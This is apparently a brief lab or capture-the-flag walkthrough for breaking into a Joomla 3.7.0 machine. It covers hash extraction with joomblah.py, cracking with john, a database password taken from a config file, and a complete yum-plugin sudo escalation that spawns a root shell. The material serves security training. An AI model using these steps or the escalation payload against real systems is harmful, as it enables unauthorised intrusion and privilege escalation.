nmap shows there is a joomla service

use metasploit to scan for version -> 3.7.0

python2 joomblah.py http://10.10.110.105/ to get user and hashed password

john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt to crack password

get a shell with php using a guide online

find /var/www/html which has credentials

```
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```

can login as the user with

```
su jjameson
```

```
sudo -l
```

shows that

```
NOPASSWD: /usr/bin/yum
```

use gtfo bins

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
